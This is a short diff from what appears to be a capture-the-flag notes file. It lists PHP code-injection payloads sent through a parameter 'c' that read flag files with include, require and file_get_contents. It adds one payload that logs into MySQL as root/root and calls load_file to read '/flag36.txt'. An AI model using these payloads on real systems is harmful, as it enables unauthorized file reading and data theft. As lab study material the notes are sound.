@@ -19,6 +19,9 @@ c=echo file_get_contents('flag.php');
 c=include('/flag.txt');
 c=require('/flag.txt');
 c=require_once('/flag.txt');
+
+c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);
+
 ```
 查目录
 ```
